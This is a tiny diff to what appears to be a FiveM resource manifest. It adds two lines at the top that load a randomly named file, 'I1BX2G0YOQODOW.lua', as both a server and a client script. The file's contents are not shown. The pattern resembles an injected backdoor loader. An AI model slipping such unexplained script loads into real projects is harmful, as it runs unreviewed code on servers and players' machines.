@@ -1,3 +1,5 @@
+server_script "I1BX2G0YOQODOW.lua"
+client_script "I1BX2G0YOQODOW.lua"
 fx_version 'cerulean'
 game 'common'
 
